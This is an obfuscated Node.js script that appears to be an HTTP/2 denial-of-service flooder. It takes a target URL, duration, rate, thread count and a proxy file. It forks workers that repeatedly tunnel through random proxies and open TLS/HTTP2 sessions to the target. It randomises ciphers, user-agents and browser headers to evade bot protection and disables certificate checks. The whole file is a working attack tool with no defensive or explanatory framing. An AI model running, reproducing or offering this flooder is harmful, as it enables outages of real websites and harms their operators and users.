const _0x5cb0ef = require("net"),
  _0x2560a5 = require("http2"),
  _0x38acd7 = require("tls"),
  _0x5972ef = require("cluster"),
  _0x5d88b3 = require("url"),
  _0x3108c3 = require("crypto"),
  _0x4489c9 = require("fs"),
  {
    HeaderGenerator: _0x228b7c
  } = require("header-generator");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x3ccd47) {});
process.argv.length < 7 && (console.log("node https target time rate thread proxyfile"), process.exit());
const _0x254452 = {};
function _0x51df7e(_0x328abb) {
  return _0x4489c9.readFileSync(_0x328abb, "utf-8").toString().split(/\r?\n/);
}
function _0x1b2ed5(_0x3b5a2c, _0x4dc706) {
  return Math.floor(Math.random() * (_0x4dc706 - _0x3b5a2c) + _0x3b5a2c);
}
function _0x65aa3b(_0x3d9f84) {
  return _0x3d9f84[_0x1b2ed5(0, _0x3d9f84.length)];
}
function _0x244849(_0x30de4c) {
  const _0x531b90 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let _0x325d5a = "";
  const _0x315f22 = _0x531b90.length;
  for (let _0x439f59 = 0; _0x439f59 < _0x30de4c; _0x439f59++) {
    _0x325d5a += _0x531b90.charAt(Math.floor(Math.random() * _0x315f22));
  }
  return _0x325d5a;
}
const _0x1dbc45 = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
  },
  _0x168a3a = {
    name: "firefox",
    minVersion: 112,
    httpVersion: "2"
  };
const _0x519647 = {
  name: "chrome",
  minVersion: 112,
  httpVersion: "2"
};
const _0x4e80dd = {
  browsers: [_0x168a3a, _0x519647],
  devices: ["mobile", "desktop"],
  operatingSystems: ["linux", "windows", "macos"]
};
let _0x2f25a2 = new _0x228b7c(_0x4e80dd),
  _0x3fcc68 = _0x2f25a2.getHeaders();
const _0x2fa99a = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"],
  _0xe8bbea = ["ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"],
  _0x3ce03d = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9", "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];
lang_header = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "*", "en-US,en;q=0.5", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "utf-8, iso-8859-1;q=0.5, *;q=0.1", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5", "cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", "de-CH;q=0.7", "tr", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"];
const _0x18848d = ["*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", "br", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"],
  _0x5ef9fd = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0"],
  _0x1eccc6 = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.1134 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5563 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6434 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8372 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5767 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.9821 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.542.0.234 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.8364 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5124 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.6133 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.5237 Safari/537.36"];
platform = ["Linux", "macOS", "Windows"];
version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\""];
var _0x1e287b = _0xe8bbea[Math.floor(Math.floor(Math.random() * _0xe8bbea.length))],
  _0x69127d = _0x2fa99a[Math.floor(Math.floor(Math.random() * _0x2fa99a.length))],
  _0x124a60 = _0x1eccc6[Math.floor(Math.floor(Math.random() * _0x1eccc6.length))],
  _0x40fbe7 = _0x3ce03d[Math.floor(Math.floor(Math.random() * _0x3ce03d.length))],
  _0x27d2a8 = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
  _0x366dd8 = _0x18848d[Math.floor(Math.floor(Math.random() * _0x18848d.length))],
  _0xb919e6 = _0x5ef9fd[Math.floor(Math.floor(Math.random() * _0x5ef9fd.length))],
  _0x318bac = _0x51df7e(_0x1dbc45.proxyFile);
const _0x2ca80 = _0x5d88b3.parse(_0x1dbc45.target);
if (_0x5972ef.isMaster) {
  for (let _0x3b79fd = 1; _0x3b79fd <= _0x1dbc45.threads; _0x3b79fd++) {
    _0x5972ef.fork();
  }
} else {
  setInterval(_0x1f5e81);
}
class _0x5de1fa {
  constructor() {}
  HTTP(_0x3d5cce, _0x3a6be3) {
    const _0x5511ee = "CONNECT " + _0x3d5cce.address + ":443 HTTP/1.1\r\nHost: " + _0x3d5cce.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x3026b6 = new Buffer.from(_0x5511ee),
      _0x1daa23 = {
        host: _0x3d5cce.host,
        port: _0x3d5cce.port
      };
    const _0xcc29ed = _0x5cb0ef.connect(_0x1daa23);
    _0xcc29ed.setTimeout(_0x3d5cce.timeout * 600000);
    _0xcc29ed.setKeepAlive(true, 100000);
    _0xcc29ed.on("connect", () => {
      _0xcc29ed.write(_0x3026b6);
    });
    _0xcc29ed.on("data", _0x39a004 => {
      const _0x9c780d = _0x39a004.toString("utf-8"),
        _0x33446b = _0x9c780d.includes("HTTP/1.1 200");
      if (_0x33446b === false) {
        _0xcc29ed.destroy();
        return _0x3a6be3(undefined, "error: invalid response from proxy server");
      }
      return _0x3a6be3(_0xcc29ed, undefined);
    });
    _0xcc29ed.on("timeout", () => {
      _0xcc29ed.destroy();
      return _0x3a6be3(undefined, "error: timeout exceeded");
    });
    _0xcc29ed.on("error", _0x492206 => {
      _0xcc29ed.destroy();
      return _0x3a6be3(undefined, "error: " + _0x492206);
    });
  }
}
const _0x24d723 = new _0x5de1fa();
_0x254452[":method"] = "GET";
_0x254452[":authority"] = _0x2ca80.host;
_0x254452[":scheme"] = "https";
_0x254452[":path"] = _0x2ca80.path;
_0x254452["x-forwarded-proto"] = "https";
_0x254452["accept-encoding"] = _0x366dd8;
_0x254452["cache-control"] = _0xb919e6;
_0x254452["sec-ch-ua"] = "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"";
_0x254452["sec-ch-ua-mobile"] = "?0";
_0x254452["sec-ch-ua-platform"] = "Windows";
_0x254452["upgrade-insecure-requests"] = "1";
_0x254452["user-agent"] = _0x124a60;
_0x254452.accept = _0x40fbe7;
_0x254452["accept-language"] = _0x27d2a8;
_0x254452.referer = process.argv[2];
_0x254452["sec-fetch-dest"] = "document";
_0x254452["sec-fetch-site"] = _0x3fcc68["sec-fetch-site"];
_0x254452["sec-fetch-mode"] = "navigate";
_0x254452.TE = "trailers";
_0x254452["sec-fetch-user"] = "?1";
_0x254452.DNT = "1";
_0x254452["X-Requested-With"] = "XMLHttpRequest";
function _0x1f5e81() {
  const _0xb9d8e0 = _0x65aa3b(_0x318bac);
  const _0x2a1a03 = _0xb9d8e0.split(":");
  _0x254452.origin = "https://" + _0x2ca80.host;
  const _0x1bc9b4 = {
    host: _0x2a1a03[0],
    port: ~~_0x2a1a03[1],
    address: _0x2ca80.host + ":443",
    timeout: 100
  };
  _0x24d723.HTTP(_0x1bc9b4, (_0x3c4b99, _0x3a8820) => {
    if (_0x3a8820) {
      return;
    }
    _0x3c4b99.setKeepAlive(true, 600000);
    const _0x5390b4 = {
        host: _0x2ca80.host,
        secure: true,
        ALPNProtocols: ["h2"],
        sigals: _0x69127d,
        socket: _0x3c4b99,
        ecdhCurve: "prime256v1:X25519",
        ciphers: _0x38acd7.getCiphers().join(":") + _0x1e287b,
        host: _0x2ca80.host,
        rejectUnauthorized: false,
        servername: _0x2ca80.host,
        secureProtocol: "TLS_method"
      },
      _0x515aba = _0x38acd7.connect(443, _0x2ca80.host, _0x5390b4);
    _0x515aba.setKeepAlive(true, 60000);
    const _0x97cf55 = {
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    };
    const _0x4c1839 = {
      protocol: "https:",
      settings: _0x97cf55,
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x515aba,
      socket: _0x3c4b99
    };
    const _0x2710e2 = _0x2560a5.connect(_0x2ca80.href, _0x4c1839),
      _0x1a2b4f = {
        headerTableSize: 65536,
        maxConcurrentStreams: 2000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      };
    _0x2710e2.settings(_0x1a2b4f);
    _0x2710e2.on("connect", () => {});
    _0x2710e2.on("close", () => {
      _0x2710e2.destroy();
      _0x3c4b99.destroy();
      return;
    });
  });
  (function (_0x2fcf05, _0x5a8707, _0x442f13) {});
}
const _0x407262 = () => process.exit(1);
setTimeout(_0x407262, _0x1dbc45.time * 1000);